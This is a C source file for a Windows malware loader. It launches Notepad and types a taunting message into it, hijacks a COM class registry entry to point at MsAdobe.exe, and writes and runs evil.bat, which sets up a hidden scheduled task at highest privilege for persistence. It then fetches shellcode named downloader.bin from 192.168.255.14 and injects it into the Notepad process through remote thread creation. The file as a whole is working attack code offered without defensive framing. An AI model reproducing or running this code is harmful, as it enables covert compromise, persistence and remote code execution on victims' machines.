#include <ws2tcpip.h>
#include <winsock2.h>
#include <winsock.h>
#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>


#include <windows.h>
#include <fileapi.h>
#include <wininet.h>
#include <stdint.h>
#include <winnt.h>
#include <unistd.h>



#pragma comment(lib, "ws2_32.lib")


	
//GET DATA FROM AN INTERNET LOCATION

//INITIALIZE WSA VARIABLES
int main() 
{
	
	STARTUPINFOW si = { 0 };
	PROCESS_INFORMATION pi = { 0 };
	long int PID;
  
	if (!CreateProcessW(
	  L"C:\\Windows\\System32\\notepad.exe",
	  NULL,
	  NULL,
	  NULL,
	  FALSE,
	  REALTIME_PRIORITY_CLASS,
	  NULL,
	  NULL,
	  &si,
	  &pi
	))
	  {
		  printf("(-) Failed to create process, error: %ld", GetLastError());
		  return EXIT_FAILURE;
	  }
	  
	  PID = pi.dwProcessId;
	  printf("(+) Process Started! pid: %ld", PID);
	  
	Sleep(1000);
		 // Find the Notepad window
    HWND hwnd = FindWindow("Notepad", NULL);

    // Find the edit control inside Notepad
    HWND hwndEdit = FindWindowEx(hwnd, NULL, "Edit", NULL);

    // Send text to Notepad
    const char *text = "Your Voucher Number is: SHOULDNOTHAVECLICKEDIT";
    for (const char *p = text; *p; ++p) {
        SendMessage(hwndEdit, WM_CHAR, (WPARAM)*p, 0);
    }
	
	//Set registry  Value - point to MsAdobe.exe

	HKEY hkey;
	LPCSTR set_string_value = "c:\\Users\\saurav\\Desktop\\MsAdobe.exe";

	RegOpenKeyExW(HKEY_CLASSES_ROOT, L"\\CLSID\\{29F458BE-8866-11D5-A3DD-00B0D0F3BAA7}\\LocalServer32", 0, KEY_SET_VALUE, &hkey); //open registry key handle.
	//RegCreateKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Classes\\WOW6432Node\\CLSID\\{00000001-0001-0001-0001-000000000001}\\LocalServer32", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hkey, NULL); //open registry key handle.
	RegSetValueExA(hkey, "", 0, REG_SZ, (const BYTE*)set_string_value, strlen(set_string_value)+1);	
	RegCloseKey(hkey);
	
	//File Vars
	const char* filename = "c:\\Users\\saurav\\Desktop\\evil.bat";
    const char* filecontent = "schtasks /create /tn HealthCheck /tr \"Powershell -WindowStyle Hidden -Command \\\"[activator]::CreateInstance([type]::GetTypeFromCLSID('''29F458BE-8866-11D5-A3DD-00B0D0F3BAA7'''))\\\"\" /rl HIGHEST /SC ONEVENT /EC \"Security\" /MO \"*[System[(EventID=4801)]]\"";

	//Create a File
	HANDLE hfile;
	hfile = CreateFileA(filename, GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hfile == INVALID_HANDLE_VALUE)
	{
		printf("File creation failed\n");
		return 1;
	}
	
	//Write to file
    BOOL WrFile;
    long unsigned int byteswritten;
    WrFile = WriteFile(hfile, filecontent, strlen(filecontent), &byteswritten, NULL);


    CloseHandle(hfile);
	
	//Run the batfile.
	system("c:\\Users\\saurav\\Desktop\\evil.bat");


	
    WORD wVersionRequested = MAKEWORD(2, 2);
    WSADATA wsadata;
    int wsa_startup;

    wsa_startup = WSAStartup(wVersionRequested, &wsadata);

		//CHECK FOR INITIALIZATION SUCCESS - FAILURE
		if (wsa_startup != 0)
		{
			printf("WSA Startup failed with error: %d\n", wsa_startup);
			return 0;
		}
		else {
			printf("No error\n");
		}


		//CREATE A SOCKET
		SOCKET victimsocket = INVALID_SOCKET;
		victimsocket = socket(AF_INET, SOCK_STREAM, 0);
		
		if (victimsocket == -1) {
			printf("Socket establishment failed \n");
		}
		else {
			printf("Socket established \n");
		}
	
	//CONNECT TO THE SOCKET
    struct sockaddr_in {
		short sin_family;
		u_short sin_port;
		u_long sin_addr;
		char sin_zero[8];
		};
	
    struct sockaddr_in server_address;
	memset(&server_address, 0, sizeof(server_address)); //initialize the address to zerods
    server_address.sin_family = AF_INET;
    server_address.sin_addr = inet_addr("192.168.255.14");
    server_address.sin_port = htons(8000);

		int victimconnect = connect(victimsocket, (struct sockaddr*)&server_address, sizeof(struct sockaddr_in));
		if (victimconnect == SOCKET_ERROR) {
			closesocket(victimsocket);
			victimsocket = INVALID_SOCKET;
		}

    //SEND DATA TO SERVER REQUESTING FOR SHELLCODE
    char *message = "GET /downloader.bin HTTP/1.1\r\nHost: 192.168.255.14\r\n\r\n";
	printf ("%s", message);
    int victimsend = send(victimsocket, message, strlen(message), 0);
		if (victimsend == -1){
			printf("send() call failed");
		}
		else { 
			printf("\nBytes Sent %d\n\n", victimsend);
			}
			shutdown(victimsocket, SD_SEND);		
		
	

    //RECIEVE DATA FROM SERVER I.E SHELLCODE
    char data[86870];
	int recv_byte;
	
	do {
    recv_byte = recv(victimsocket, (char*)data, sizeof(data), 0);
	printf("bytes recv %d\n", recv_byte);
	//if (recv_byte == -1) {
	//	printf("recv() call failed\n");
	//	}
		
				if (recv_byte > 0)
				Sleep (1000);
					{
					printf("Data is:  %s \n", data);
				}
				if (recv_byte > 204){
					HANDLE targetProcessThread;

					//handle that stores remote process handle
					HANDLE targetProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, TRUE, PID);
					
					//allocate memory in remote process
					void* exec_mem = VirtualAllocEx(targetProcessHandle, NULL, recv_byte, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

					//Write buff to exe mem region
					WriteProcessMemory(targetProcessHandle, exec_mem, data, recv_byte, NULL);

					//creates a thread that executes in exec_mem region
					targetProcessThread = CreateRemoteThread(targetProcessHandle, NULL, 0, (LPTHREAD_START_ROUTINE)exec_mem, NULL, 0, 0);

					//Close the handle
					CloseHandle(targetProcessHandle); 
				}
				else if (recv_byte == 0) {
					printf("completed");
				}
				else {
					printf("GOOD BYE");
				}
			} while (recv_byte > 0);

			closesocket(victimsocket);
			
			return 0;
		}
    //LOOP UNTILL ALL DATA IS TRANSFERRED OR PEER CLOSES THE CONNECTION
    //PRINT THE OUTPUT FOR VERIFICATION
      
